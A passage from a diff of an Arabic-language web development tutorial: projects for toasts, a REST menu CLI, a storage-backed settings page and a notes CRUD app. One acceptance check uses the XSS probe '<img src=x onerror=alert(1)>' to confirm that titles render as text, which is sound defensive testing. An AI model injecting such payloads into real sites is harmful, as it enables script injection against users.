+- **[[dismiss(li)]]:** [[li.dataset.leaving]] بيمنع إنه يتقفل مرتين (التايمر وزرار × في نفس اللحظة)، و [[fill: "forwards"]] بيخليه مختفي لحد ما [[await out.finished]] ثم [[li.remove()]].
+- **[[{ once: true }]]** على زرار ×: ضغطتين سريعين مش هيندهوا [[dismiss]] مرتين.
+- **[[aria-live="polite"]]** على اللستة: قارئ الشاشة بيقول الإشعار الجديد.
+
+## ليه animation للوقت مش [[setTimeout]]
+
+بـ [[setTimeout(() => dismiss(li), ms)]] الوقف بالماوس محتاج [[clearTimeout]] وتحسب الوقت الفاضل بـ [[Date.now()]] وتبدأ تايمر جديد. الـ animation بتعمل ده في سطرين ([[pause]] و [[play]])، وبتعرض الوقت الفاضل كمان.
+
+## اللي ظهر في القياس
+
+**في Playwright المدد كانت أطول بكتير من المكتوب:** قسنا animation مدتها ٢٠٠ms خدت ١٠١٦ms، و ١٠ [[requestAnimationFrame]] خدوا ٩١٤٩ms (حوالي frame في الثانية)، مع إن [[document.visibilityState]] = [["visible"]]. شباك المتصفح كان مستخبي ورا شبابيك تانية، فـ Chrome بطّأ الـ frames. الحالات والترتيب صح، بس الوقت بالملي ثانية مبيتقاسش كده: قيسه في شباك ظاهر، أو اعتمد على [[finished]] مش على الساعة.
+
+## اتقاس
+
+- Playwright في Chrome 157: العدد والسطر بعد كل خطوة، والـ keyframes مع [[emulateMedia({ reducedMotion: "reduce" })]]، ومفيش [[pageerror]].
+- في الـ preview الحي في الموقع ده: [[element.animate]] شغال جوه الـ sandbox، وضغطة «اتحفظ» طلّعت إشعار.` },
+        { lvl: 'متوسط', t: R`أداة سطر أوامر للمنيو`, what: R`[[menu.js]] بتكلّم الـ REST API بتاع درس «REST و CRUD بـ fetch»: [[node menu.js list]] بيطبع جدول (id واسم وسعر)، و [[add <name> <price>]] و [[price <id> <price>]] و [[rename <id> <name>]] (بـ [[PATCH]])، و [[rm <id>]]. كل خطأ بيتكتب برسالة السيرفر نفسها وبالـ status، والبرنامج بيخرج بـ exit code [[1]]. والسيرفر واقف = رسالة واضحة مش stack trace، وطلب بيعلق أكتر من ٥ ثواني بيتلغي بـ [[AbortSignal.timeout]].`, done: R`كل أمر صح بيطبع النتيجة و exit [[0]]، و [[add قهوة 45]] بيطبع «409: الصنف ده موجود»، و [[add موكا]] (من غير سعر) بيطبع «السعر لازم رقم» من غير ما يكلّم السيرفر، و [[rm 3]] مرتين = ٠ ثم ١، والسيرفر واقف = «مش قادر أوصل للسيرفر (ECONNREFUSED)».`, sol: R`## الشكل النهائي
+
+~~~text الناتج: السيرفر واقف، وبعدين node server.js في ترمنال تاني (Git Bash، Node 24.22)
+$ node menu.js list
+خطأ: مش قادر أوصل للسيرفر (ECONNREFUSED)
+(exit 1)
+$ node menu.js list
+  1  قهوة        45.00 ج.م
+  2  شاي         20.00 ج.م
+(exit 0)
+$ node menu.js add لاتيه 60
+اتضاف:   3  لاتيه       60.00 ج.م
+(exit 0)
+$ node menu.js add قهوة 45
+خطأ: 409: الصنف ده موجود
+(exit 1)
+$ node menu.js add موكا
+خطأ: السعر لازم رقم
+(exit 1)
+$ node menu.js price 3 65
+اتعدل:   3  لاتيه       65.00 ج.م
+(exit 0)
+$ node menu.js rename 3 فلات_وايت
+اتعدل:   3  فلات_وايت   65.00 ج.م
+(exit 0)
+$ node menu.js price 9 10
+خطأ: 404: الصنف 9 مش موجود
+(exit 1)
+$ node menu.js rm 3
+اتمسح 3
+(exit 0)
+$ node menu.js rm 3
+خطأ: 404: الصنف 3 مش موجود
+(exit 1)
+$ node menu.js fly
+خطأ: الاستخدام: node menu.js list | add <name> <price> | price <id> <price> | rename <id> <name> | rm <id>
+(exit 1)
+~~~
+
+## الكود
+
+الملف ده جنب [[server.js]] بتاع الدرس (اللي بيشتغل على بورت ٣٠٠٠):
+
+~~~js menu.js
+// menu.js: أداة سطر أوامر بتكلّم الـ REST API بتاع المنيو
+// node menu.js list | add <name> <price> | price <id> <price> | rename <id> <name> | rm <id>
+const API = process.env.MENU_API || "http://localhost:3000/api/items";
+
+async function call(method, path = "", body) {
+  let res;
+  try {
+    res = await fetch(API + path, {
+      method,
+      headers: body ? { "Content-Type": "application/json" } : {},
+      body: body && JSON.stringify(body),
+      signal: AbortSignal.timeout(5000),
+    });
+  } catch (err) {
+    const why = err.name === "TimeoutError" ? "السيرفر مردّش في ٥ ثواني" : "مش قادر أوصل للسيرفر (" + (err.cause?.code || err.message) + ")";
+    throw new Error(why);
+  }
+  const data = res.status === 204 ? null : await res.json().catch(() => null);
+  if (!res.ok) throw new Error(res.status + ": " + (data?.error || res.statusText));
+  return data;
+}
+
+const money = n => n.toFixed(2) + " ج.م";
+const row = i => String(i.id).padStart(3) + "  " + i.name.padEnd(12) + money(i.price);
+
+function needNumber(value, what) {
+  const n = Number(value);
+  if (value === undefined || !Number.isFinite(n)) throw new Error(what + " لازم رقم");
+  return n;
+}
+
+async function main([cmd, a, b]) {
+  switch (cmd) {
+    case "list": {
+      const items = await call("GET");
+      if (!items.length) return console.log("المنيو فاضي");
+      return console.log(items.map(row).join("\n"));
+    }
+    case "add": {
+      const item = await call("POST", "", { name: a ?? "", price: needNumber(b, "السعر") });
+      return console.log("اتضاف:", row(item));
+    }
+    case "price":
+      return console.log("اتعدل:", row(await call("PATCH", "/" + needNumber(a, "الـ id"), { price: needNumber(b, "السعر") })));
+    case "rename":
+      return console.log("اتعدل:", row(await call("PATCH", "/" + needNumber(a, "الـ id"), { name: b ?? "" })));
+    case "rm":
+      await call("DELETE", "/" + needNumber(a, "الـ id"));
+      return console.log("اتمسح", a);
+    default:
+      throw new Error("الاستخدام: node menu.js list | add <name> <price> | price <id> <price> | rename <id> <name> | rm <id>");
+  }
+}
+
+main(process.argv.slice(2)).catch(err => {
+  console.error("خطأ:", err.message);
+  process.exitCode = 1;
 });
 ~~~
 
-~~~js eager.mjs
-// node eager.mjs sales.csv: نفس التقرير بس الملف كله في الذاكرة، عشان نقارن
-import { readFileSync } from 'node:fs';
-import { rows } from './csv.mjs';
-import { summarize } from './report.mjs';
-const started = performance.now();
-const lines = readFileSync(process.argv[2], 'utf8').split('\n');
-const all = await Array.fromAsync(rows(lines));
-const report = await summarize(all);
-console.log('صفوف: ' + report.count + ' | ' + Math.round(performance.now() - started) + 'ms | ذاكرة ' + Math.round(process.memoryUsage().rss / 1e6) + ' MB');
+## كل حتة بتعمل إيه
+
+- **[[call(method, path, body)]]:** المكان الوحيد اللي فيه [[fetch]]. بيحوّل أي حاجة غلط لـ [[Error]] برسالة واحدة: الشبكة («مش قادر أوصل»)، والمهلة، والـ status اللي مش ok برسالة السيرفر. فـ [[main]] مبيعرفش حاجة عن HTTP.
+- **[[err.cause?.code]]:** [[fetch]] في Node بيرمي [[TypeError: fetch failed]] والسبب الحقيقي ([[ECONNREFUSED]] أو [[ENOTFOUND]]) جوه [[cause]].
+- **[[AbortSignal.timeout(5000)]]:** لو السيرفر علّق، الطلب بيتلغي بـ [[TimeoutError]] بدل ما الأداة تفضل مستنية (درس «fetch و AbortController»).
+- **[[needNumber]] قبل الطلب:** «موكا» من غير سعر اتمسكت في الـ client، فمفيش طلب راح أصلًا. والسيرفر بيفحص تاني (أي client تاني ممكن يبعت أي حاجة).
+- **[[price]] و [[rename]] بـ [[PATCH]]** بالحقل اللي اتغيّر بس، مش [[PUT]] بالصنف كله: مش محتاجين نجيب الصنف الأول.
+- **[[process.exitCode = 1]]** مش [[process.exit(1)]]: البرنامج بيخلص طبيعي (الـ output يتطبع كله) ويرجّع ١، فسكربت bash يقدر يعمل [[node menu.js add ... || echo فشل]].
+- **[[MENU_API]] من الـ environment:** نفس الأداة تكلّم سيرفر تاني من غير تعديل.
+
+## الغلطة اللي حصلت
+
+**أول نسخة كانت بتكتب السعر بـ [[Intl.NumberFormat("ar-EG", { style: "currency", currency: "EGP" })]]:** الناتج طلع «٤٥٫٠٠ ج.م.» بأرقام عربي وحوالين الرقم حروف مخفية (علامات اتجاه RLM ومسافة NBSP، درس «Intl: الـ locale والتفاوض»)، فاللي ينسخ الناتج أو يعمل عليه [[grep "45"]] مش هيلاقي حاجة، والفاحص بتاع الموقع ده نفسه بيرفض الحروف المخفية دي في الدروس. رجعنا لـ [[toFixed(2) + " ج.م"]]: أداة ترمنال الناتج بتاعها المفروض يتقري ويتفلتر.
+
+## اتقاس
+
+كل الأوامر اللي فوق اتشغّلت بالترتيب ده على Node 24.22 (Git Bash على ويندوز)، والـ exit code بعد كل واحد من [[$?]].` },
+        { lvl: 'متوسط', dir: "settings-panel", t: R`صفحة إعدادات بتفتكر في ٣ أماكن`, what: R`صفحة إعدادات فيها: الثيم (فاتح/غامق) في **كوكي** لسنة، وحجم الخط (١٤ لـ ٢٢) في **[[localStorage]]**، وآخر تبويب فتحته في **[[sessionStorage]]**. كل إعداد بيتطبّق على طول، وبيرجع بعد الـ reload، وحجم الخط بيتغيّر في التابات التانية المفتوحة من غير reload (الحدث [[storage]]). ولو التخزين ممنوع (sandbox أو إعدادات المتصفح) الصفحة بتشتغل من الذاكرة وبتقول لليوزر «الإعدادات هتتنسي مع الـ reload» بدل ما تقع. وقيمة بايظة محفوظة (حجم ٩٩٩) بترجع للافتراضي. من دروس «Web Storage» و «document.cookie» و «تختار تخزين إيه».`, done: R`بعد ما تختار غامق و ٢٠px والخصوصية: الكوكي [[theme=dark]]، و [[font-size]] = [["20"]]، و [[tab]] = [["privacy"]]. تاب جديد: غامق و ٢٠px بس التبويب «الحساب». تغيير الحجم لـ ١٤ في تاب = ١٤ في التاني على طول. reload لنفس التاب = «الخصوصية». و [[localStorage]] فيها ٩٩٩ = ١٦px. وفي الـ preview الحي: الرسالة الصفرا ظاهرة والإعدادات شغالة.`, sol: R`## الشكل النهائي
+
+~~~live 420 index.html
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>الإعدادات</title>
+<style>
+  :root { --bg: #fff; --fg: #1b1b1b; --card: #f3f4f6; --size: 16px; }
+  :root[data-theme="dark"] { --bg: #111418; --fg: #e8eaed; --card: #1d2228; }
+  body { margin: 16px; font: var(--size)/1.6 system-ui, sans-serif; background: var(--bg); color: var(--fg); }
+  fieldset { border: 1px solid #8884; border-radius: 8px; margin-block: 10px; background: var(--card); }
+  .note { font-size: 14px; padding: 8px 10px; border-radius: 6px; background: #fff3cd; color: #5c4500; }
+  [role="tablist"] button[aria-selected="true"] { font-weight: 700; text-decoration: underline; }
+</style>
+</head>
+<body>
+<h1>الإعدادات</h1>
+<p id="where" class="note" hidden></p>
+<fieldset>
+  <legend>الثيم (كوكي سنة)</legend>
+  <label><input type="radio" name="theme" value="light"> فاتح</label>
+  <label><input type="radio" name="theme" value="dark"> غامق</label>
+</fieldset>
+<fieldset>
+  <legend>حجم الخط (localStorage)</legend>
+  <input type="range" id="size" min="14" max="22" step="2" aria-label="حجم الخط"> <output id="size-out"></output>
+</fieldset>
+<fieldset>
+  <legend>آخر تاب فتحته (sessionStorage)</legend>
+  <div role="tablist">
+    <button type="button" role="tab" data-tab="account">الحساب</button>
+    <button type="button" role="tab" data-tab="privacy">الخصوصية</button>
+  </div>
+  <p id="panel"></p>
+</fieldset>
+<script>
+// كل نوع تخزين وراه احتياطي في الذاكرة، عشان الصفحة تشتغل حتى لو التخزين ممنوع
+function safeStorage(kind) {
+  try {
+    const s = window[kind];
+    const probe = "__probe__";
+    s.setItem(probe, probe);
+    s.removeItem(probe);
+    return { ok: true, get: k => s.getItem(k), set: (k, v) => s.setItem(k, v) };
+  } catch (err) {
+    const mem = new Map();
+    return { ok: false, why: err.name, get: k => mem.get(k) ?? null, set: (k, v) => mem.set(k, String(v)) };
+  }
+}
+const local = safeStorage("localStorage");
+const session = safeStorage("sessionStorage");
+
+const cookies = {
+  get(name) {
+    try {
+      const pair = document.cookie.split("; ").find(c => c.startsWith(name + "="));
+      return pair ? decodeURIComponent(pair.slice(name.length + 1)) : null;
+    } catch { return null; }
+  },
+  set(name, value, days) {
+    try { document.cookie = name + "=" + encodeURIComponent(value) + "; max-age=" + days * 86400 + "; path=/; SameSite=Lax"; return true; }
+    catch { return false; }
+  },
+};
+
+const blocked = [!local.ok && "localStorage", !session.ok && "sessionStorage", cookies.set("probe", "1", 0) || "الكوكيز"].filter(x => typeof x === "string");
+if (blocked.length) {
+  const where = document.querySelector("#where");
+  where.hidden = false;
+  where.textContent = "التخزين مقفول هنا (" + blocked.join(" و ") + ")، فالإعدادات هتتنسي مع الـ reload. الصفحة شغالة عادي.";
+}
+
+// الثيم
+function applyTheme(theme) {
+  document.documentElement.dataset.theme = theme;
+  document.querySelector('[name="theme"][value="' + theme + '"]').checked = true;
+}
+applyTheme(cookies.get("theme") === "dark" ? "dark" : "light");
+for (const r of document.querySelectorAll('[name="theme"]')) {
+  r.addEventListener("change", () => { applyTheme(r.value); cookies.set("theme", r.value, 365); });
+}
+
+// حجم الخط
+const size = document.querySelector("#size");
+function applySize(px) {
+  const n = [14, 16, 18, 20, 22].includes(Number(px)) ? Number(px) : 16;
+  document.documentElement.style.setProperty("--size", n + "px");
+  size.value = n;
+  document.querySelector("#size-out").textContent = n + "px";
+}
+applySize(local.get("font-size"));
+size.addEventListener("input", () => { applySize(size.value); local.set("font-size", size.value); });
+
+// تاب تاني غيّر الحجم؟ نطبّقه هنا من غير reload
+addEventListener("storage", e => { if (e.key === "font-size") applySize(e.newValue); });
+
+// آخر تاب
+const TEXT = { account: "اسمك وإيميلك.", privacy: "مين يشوف ملاحظاتك." };
+function openTab(name) {
+  if (!TEXT[name]) name = "account";
+  for (const b of document.querySelectorAll("[data-tab]")) b.setAttribute("aria-selected", String(b.dataset.tab === name));
+  document.querySelector("#panel").textContent = TEXT[name];
+  session.set("tab", name);
+}
+document.querySelector("[role=tablist]").addEventListener("click", e => {
+  const b = e.target.closest("[data-tab]");
+  if (b) openTab(b.dataset.tab);
+});
+openTab(session.get("tab"));
+</script>
+</body>
+</html>
 ~~~
 
-~~~json package.json
-{ "type": "module" }
+## هتشوف إيه
+
+في الـ preview اللي فوق **هتشوف رسالة صفرا**: «التخزين مقفول هنا (localStorage و sessionStorage و الكوكيز)…». ده مقصود ومهم: الـ preview الحي في الموقع ده [[iframe]] عليه [[sandbox]] من غير [[allow-same-origin]]، فالتلات أماكن بيرموا [[SecurityError]]، والصفحة كمّلت من الذاكرة: اختار «غامق» وحرّك الحجم وهتلاقيهم شغالين، بس الـ reload بينساهم. انسخ الملف وشغّله من سيرفر محلي والرسالة هتختفي.
+
+~~~text الناتج (Chrome 157 من سيرفر محلي، Playwright، تابين)
+البداية:              theme light | 16px | «اسمك وإيميلك.» | الرسالة الصفرا مستخبية
+بعد الاختيارات:        cookie=theme=dark | local=20 | session=privacy
+تاب جديد:              theme dark | 20px | «اسمك وإيميلك.»
+الحجم ١٤ في الأول:      التاني بقى 14px (computed font-size: 14px)
+reload لنفس التاب:     «مين يشوف ملاحظاتك.»
+font-size = "999":     16px
 ~~~
 
-**كل حتة بتعمل إيه:**
+~~~text الناتج (نفس الملف جوه الـ preview الحي في الموقع، Chrome 157)
+التخزين مقفول هنا (localStorage و sessionStorage و الكوكيز)، فالإعدادات هتتنسي مع الـ reload. الصفحة شغالة عادي.
+اختيار «غامق» ← data-theme = dark
+~~~
 
-- **[[parseLine]]:** state machine صغيرة بحرف حرف: جوه علامات التنصيص الفاصلة حرف عادي و [[""]] بتبقى [["]]، وبرّاها الفاصلة بتقفل الخانة. ولو السطر خلص والعلامة مفتوحة بترمي، و [[rows]] بتحوّلها [[CsvError]] برقم السطر.
-- **[[readLines]]:** [[yield* rl]] بيسلّم لـ readline، والـ [[finally]] بتقفل الـ readline **والملف**. ده أهم سطرين في المشروع (الغلطة الأولى تحت).
-- **[[rows(lines)]]:** بتاخد **أي** iterable سطور، sync أو async ([[for await]] بيقبل الاتنين). عشان كده الاختبارات بتبعت array، والـ CLI بيبعت [[readLines]]، و [[eager.mjs]] بيبعت [[split('\n')]]. السطر البايظ بيروح لـ [[onError]] و [[continue]]: القراية مبتقفش عشان سطر واحد.
-- **[[summarize]]:** لفة واحدة بـ [[for await]]، والفلوس بالقروش ([[Math.round(qty * price * 100)]]) عشان مفيش [[0.30000000000000004]] (الاختبار الأخير بيتأكد: ٣ × 0.1 + 0.2 = 0.5 بالظبط). و [[break]] عند الـ limit بيقفل السلسلة كلها لحد الملف. والترتيب في الآخر بـ [[entries().toArray()]] و [[entries().map(...).toArray()]] (iterator helpers) لأن عدد المدن صغير.
-- **[[cli.mjs]]:** [[parseArgs]] من [[node:util]] بيرفض أي option مش معروفة لوحده، و [[access]] بيتأكد إن الملف موجود قبل ما نبدأ، و [[setInterval]] كل 20ms بيسجّل أقصى [[rss]] (ذاكرة البرنامج كلها)، و [[process.exit(1)]] في كل خطأ عشان أي script بيستخدم الأداة يعرف إنها فشلت.
+## كل حتة بتعمل إيه
 
-### الاختبارات والحالات الطرفية
+- **[[safeStorage(kind)]]:** بتجرّب [[setItem]] و [[removeItem]] على مفتاح تجربة. لو نجحت بترجّع واجهة على التخزين الحقيقي، ولو رمت (حتى قراية [[window[kind]]] نفسها بترمي في الـ sandbox) بترجّع نفس الواجهة على [[Map]] في الذاكرة. باقي الكود مبيعرفش الفرق.
+- **[[cookies.set]] في [[try]]:** [[document.cookie]] نفسها بترمي في الـ sandbox. و [[cookies.set("probe", "1", 0)]] بيجرّب الكتابة وبيمسح في نفس اللحظة ([[max-age=0]]).
+- **[[encodeURIComponent]] و [[decodeURIComponent]]** في الكوكي حتى لو القيم إنجليزي النهارده.
+- **الثيم كوكي ليه؟** عشان لو الصفحة دي اترسمت من سيرفر، السيرفر يقرا [[theme]] من أول طلب ويحط [[data-theme]] في الـ HTML (مشروع الملاحظات بيعمل ده). الحجم مالوش لازمة عند السيرفر، فـ [[localStorage]]. والتبويب للتاب ده بس، فـ [[sessionStorage]].
+- **[[applySize]] بتقبل ٥ قيم بس:** أي حاجة تانية محفوظة (قديمة أو متعدّلة بإيد) بترجع ١٦. ده التحقق اللي درس «خلّي التطبيق يفتكر» بيطلبه.
+- **[[addEventListener("storage", ...)]]:** بيطبّق الحجم الجديد اللي تاب تاني كتبه. التاب اللي كتب بيطبّق بنفسه في [[input]].
 
-~~~text الناتج: node --test
-✔ parseLine: فاصلة جوه علامات تنصيص، و "" جواها (1.7401ms)
-✔ parseLine: علامة مفتوحة بترمي (0.4309ms)
-✔ rows: header و أنواع و رقم السطر، والسطر الفاضي بيتعدّى (0.3814ms)
-✔ rows: السطور البايظة بتروح لـ onError ومبتوقفش القراية (0.6124ms)
-✔ rows: ملف فاضي بيرمي CsvError (0.4645ms)
-✔ readLines + rows من ملف حقيقي فيه \r\n (ويندوز) (11.2974ms)
-✔ limit: بيقف بدري ويقفل الـ stream قبل آخر الملف (20.2131ms)
-✔ summarize: فلتر المدينة والإيراد بالقروش من غير كسور (0.6082ms)
+## ليه [[safeStorage]] مش [[const local = localStorage]]
+
+قبل ما نكتب الصفحة قسنا الـ preview الحي بتاع الموقع: مجرد قراية [[localStorage]] جوه الـ sandbox بترمي [[SecurityError: Failed to read the 'localStorage' property from 'Window': The document is sandboxed and lacks the 'allow-same-origin' flag.]]، ونفس الكلام لـ [[sessionStorage]] و [[document.cookie]] (في القراية والكتابة). سطر زي [[const local = localStorage]] في أول السكربت كان هيوقف السكربت كله، والصفحة تبقى من غير ولا زرار شغال. ونفس ده بيحصل عند يوزر قافل الـ site data في المتصفح. فالقاعدة: أول وصول للتخزين جوه [[try]]، ومكان احتياطي.
+
+**فخ الوحدات:** [[max-age]] بالثواني، فالأيام [[days * 86400]]. [[max-age=365]] كانت هتبقى ٦ دقايق.
+
+## اتقاس
+
+- Playwright في Chrome 157 من سيرفر [[node:http]] محلي: السطور فوق بتابين في نفس الـ context، ومفيش [[pageerror]].
+- نفس الملف اتحط في [[showHTML]] بتاعة الموقع (نفس الـ sandbox بتاع الـ preview): الرسالة ظهرت والثيم اتغيّر.` },
+        { lvl: 'كبير', dir: "notes-crud", t: R`تطبيق ملاحظات كامل: REST API وصفحة وتخزين واختبارات`, what: R`تطبيق ملاحظات بيشتغل من سيرفر واحد بـ [[node:http]] من غير مكتبات: الـ API [[/api/notes]] (لستة، وإضافة 201، وتعديل [[PATCH]] بـ [[version]] و 409 لو الملاحظة اتعدلت من مكان تاني، ومسح 204، و 400 و 404 و 405 و 413)، وبيقدّم الصفحة نفسها من نفس الـ origin. الصفحة: لستة وفورم إضافة وتعديل ومسح بتأكيد، وكل الطلبات بـ [[fetch]] ودالة واحدة للأخطاء. المسودة بتتحفظ في [[localStorage]] مع كل حرف وترجع بعد الـ reload وتتمسح بعد الحفظ، والثيم في كوكي والسيرفر بيقراه ويحطه في الـ HTML قبل ما الصفحة توصل (مفيش وميض). حالات الخطأ: السيرفر واقف = بانر أحمر والمسودة باقية، و 400 تحت الفورم، و 409 رسالة والتعديل يتحفظ في المحاولة التانية، و 404 يرجّع اللستة. و [[node --test]] بـ ٨ اختبارات للـ API. من الوحدة كلها.`, done: R`[[node --test]] = ٨ pass. وفي المتصفح: مسودة اتكتبت ورجعت بعد reload، والحفظ مسحها؛ عنوان [[<img src=x onerror=alert(1)>]] اتعرض نص ومفيش [[img]] في الصفحة؛ عنوان فاضي = «العنوان مطلوب»؛ تعديل بعد ما تاب تاني عدّل = «الملاحظة اتعدلت من مكان تاني» والمحاولة التانية نجحت؛ «امسح» بقت «متأكد؟» والضغطة التانية مسحت؛ الثيم الغامق رجع بعد reload والـ HTML جاي من السيرفر فيه [[data-theme="dark"]]؛ والسيرفر واقف = بانر «السيرفر مش بيرد» والمسودة لسه محفوظة.`, ext: R`(١) احفظ الملاحظات في ملف JSON بـ [[fs/promises]] (اكتب في ملف مؤقت وبعدين [[rename]] عشان الملف ميبوظش لو السيرفر وقع في النص). (٢) بحث بـ [[?q=]] في السيرفر و [[URLSearchParams]] في الصفحة. (٣) في الـ 409 اعرض النسختين جنب بعض واليوزر يختار بدل ما التانية تكتب فوق. (٤) [[ETag]] و [[If-Match]] بدل [[version]] في الـ body (ده الشكل الرسمي في HTTP). (٥) الإشعارات من مشروع «إشعارات بتدخل وتخرج» بعد كل حفظ ومسح.`, sol: R`## الشكل النهائي
+
+اللقطة دي من الصفحة الحقيقية بعد ملاحظتين، وفي الفورم مسودة بتتكتب (اتاخدت من Playwright والـ scripts متشالة، عشان الـ preview مفيهوش سيرفر):
+
+~~~view 560
+<!doctype html>
+<html lang="ar" dir="rtl" data-theme="light">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>ملاحظاتي</title>
+<style>
+:root { --bg: #fff; --fg: #1b1b1b; --card: #f3f4f6; --line: #d1d5db; --accent: #0b6e4f; --err: #b42318; }
+[data-theme="dark"] { --bg: #111418; --fg: #e8eaed; --card: #1d2228; --line: #3a414a; --accent: #5fd3a6; --err: #ff8a80; }
+* { box-sizing: border-box; }
+body { margin: 0 auto; max-width: 640px; padding: 16px; font: 16px/1.6 system-ui, sans-serif; background: var(--bg); color: var(--fg); }
+header { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
+h1 { font-size: 1.5rem; margin: 0; }
+label { display: block; margin-block: 8px; }
+input, textarea { display: block; width: 100%; padding: 8px; font: inherit; color: inherit; background: var(--card); border: 1px solid var(--line); border-radius: 6px; }
+button { font: inherit; padding: 6px 14px; border-radius: 6px; border: 1px solid var(--line); background: var(--card); color: inherit; cursor: pointer; }
+button[type="submit"] { background: var(--accent); color: var(--bg); border-color: var(--accent); }
+.row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+.error { color: var(--err); min-height: 1.6em; margin: 0; }
+#banner { background: var(--err); color: #fff; padding: 8px 12px; border-radius: 6px; }
+#list { list-style: none; padding: 0; display: grid; gap: 10px; }
+.note { background: var(--card); border: 1px solid var(--line); border-radius: 8px; padding: 10px 14px; }
+.note h2 { font-size: 1.1rem; margin: 0 0 4px; }
+.note .body { margin: 0 0 8px; white-space: pre-wrap; overflow-wrap: anywhere; }
+.note.editing { outline: 2px solid var(--accent); }
+</style>
+</head>
+<body>
+  <header>
+    <h1>ملاحظاتي</h1>
+    <button id="theme" type="button" aria-pressed="false">الوضع الغامق</button>
+  </header>
+  <form id="form">
+    <label>العنوان <input name="title" maxlength="80" value="مسودة لسه"></label>
+    <label>الملاحظة <textarea name="body" rows="3" maxlength="2000"></textarea></label>
+    <p id="form-error" class="error" aria-live="polite"></p>
+    <div class="row">
+      <button id="save" type="submit">أضف</button>
+      <small id="draft-state">المسودة محفوظة</small>
+    </div>
+  </form>
+  <ul id="list">
+    <li class="note">
+      <h2>ميعاد الدكتور</h2>
+      <p class="body">الخميس الساعة ٦</p>
+      <div class="row"><button type="button">عدّل</button> <button type="button">امسح</button></div>
+    </li>
+    <li class="note">
+      <h2>اشتري بن</h2>
+      <p class="body">نص كيلو محوّج</p>
+      <div class="row"><button type="button">عدّل</button> <button type="button">امسح</button></div>
+    </li>
+  </ul>
+</body>
+</html>
+~~~
+
+## هتشوف إيه
+
+صفحة واحدة: فوق العنوان وزرار الثيم، وبعدين الفورم (عنوان وملاحظة و «أضف» وجنبه حالة المسودة)، وتحت الملاحظات كروت، الأحدث فوق. «عدّل» بيملا الفورم ويعلّم على الكارت بإطار أخضر والزرار يبقى «احفظ التعديل» ويظهر «إلغاء التعديل». «امسح» بيبقى «متأكد؟» والضغطة التانية بتمسح. «الوضع الغامق» بيقلب الألوان كلها وبيفضل بعد الـ reload. والسيرفر لو وقف بانر أحمر فوق.
+
+## ليه الأدوات دي
+
+| الحاجة | اخترنا | البديل | ليه هنا |
+|---|---|---|---|
+| السيرفر | [[node:http]] | Express أو Fastify | ٣ routes بس، ومن غير مكتبة كل سطر في الطلب والرد باين (ده هدف الوحدة). في مشروع أكبر Express بيوفّر الـ routing والـ body parsing |
+| التخزين في السيرفر | [[Map]] في الذاكرة | ملف JSON أو SQLite | أبسط حاجة تختبر بيها الـ API. بتروح مع الـ restart (أول بند في التوسعة) |
+| التعارض | [[version]] في الـ body و 409 | [[ETag]] و [[If-Match]] و 412 | نفس الفكرة (optimistic concurrency) وأسهل تتقري. الـ ETag هو الشكل الرسمي في HTTP |
+| المسودة | [[localStorage]] | [[sessionStorage]] أو IndexedDB | لازم تعيش لو التاب اتقفل غلط، وصغيرة، والـ [[storage]] event ببلاش |
+| الثيم | كوكي | [[localStorage]] | السيرفر محتاجه في أول طلب عشان يرسم الصفحة بالثيم الصح من غير وميض |
+| الاختبارات | [[node --test]] | Vitest أو Jest | جوه Node، صفر تسطيب، و [[fetch]] جاهز |
+
+## شجرة الملفات
+
+~~~text
+notes-crud/
+├── server.js          الـ API، وبيقدّم الصفحة، وبيقرا كوكي الثيم
+├── server.test.js     ٨ اختبارات للـ API بـ node --test
+└── public/
+    ├── index.html     الهيكل و template الكارت
+    ├── style.css      الألوان بمتغيّرات، والغامق بـ [data-theme="dark"]
+    └── app.js         fetch والرسم والمسودة والثيم
+~~~
+
+التشغيل: [[node server.js]] وافتح [[http://localhost:3000]]، والاختبارات: [[node --test]] من نفس الفولدر.
+
+## الكود
+
+~~~js server.js
+// server.js: REST API للملاحظات + بيقدّم الصفحة نفسها من نفس الـ origin
+const http = require("node:http");
+const fs = require("node:fs/promises");
+const path = require("node:path");
+
+const FILES = {
+  "/": ["index.html", "text/html; charset=utf-8"],
+  "/app.js": ["app.js", "text/javascript; charset=utf-8"],
+  "/style.css": ["style.css", "text/css; charset=utf-8"],
+};
+const THEMES = ["light", "dark"];
+
+function createApp() {
+  const notes = new Map();
+  let nextId = 1;
+
+  const send = (res, status, body) => {
+    if (body === undefined) { res.writeHead(status); return res.end(); }
+    res.writeHead(status, { "Content-Type": "application/json; charset=utf-8" });
+    res.end(JSON.stringify(body));
+  };
+
+  async function readJson(req) {
+    let text = "";
+    for await (const chunk of req) {
+      text += chunk;
+      if (text.length > 10000) return { tooBig: true };
+    }
+    try { return { data: JSON.parse(text) }; } catch { return {}; }
+  }
+
+  function problem(body, partial) {
+    if (!body || typeof body !== "object" || Array.isArray(body)) return "الـ body لازم JSON object";
+    if (!partial || "title" in body) {
+      if (typeof body.title !== "string" || !body.title.trim()) return "العنوان مطلوب";
+      if (body.title.length > 80) return "العنوان أطول من ٨٠ حرف";
+    }
+    if ("body" in body && (typeof body.body !== "string" || body.body.length > 2000)) return "الملاحظة نص لحد ٢٠٠٠ حرف";
+    return null;
+  }
+
+  function themeFrom(req) {
+    const m = /(?:^|;\s*)theme=([^;]*)/.exec(req.headers.cookie || "");
+    return m && THEMES.includes(m[1]) ? m[1] : "light";
+  }
+
+  return http.createServer(async (req, res) => {
+    const url = new URL(req.url, "http://localhost");
+
+    if (req.method === "GET" && FILES[url.pathname]) {
+      const [file, type] = FILES[url.pathname];
+      let text = await fs.readFile(path.join(__dirname, "public", file), "utf8");
+      if (file === "index.html") text = text.replace('data-theme="light"', 'data-theme="' + themeFrom(req) + '"');
+      res.writeHead(200, { "Content-Type": type, "Cache-Control": "no-cache" });
+      return res.end(text);
+    }
+
+    const m = url.pathname.match(/^\/api\/notes(?:\/(\d+))?$/);
+    if (!m) return send(res, 404, { error: "مش موجود" });
+    const id = m[1] ? Number(m[1]) : null;
+
+    if (id === null) {
+      if (req.method === "GET") return send(res, 200, [...notes.values()].sort((a, b) => b.updatedAt - a.updatedAt));
+      if (req.method === "POST") {
+        const { data, tooBig } = await readJson(req);
+        if (tooBig) return send(res, 413, { error: "الطلب كبير" });
+        const why = problem(data, false);
+        if (why) return send(res, 400, { error: why });
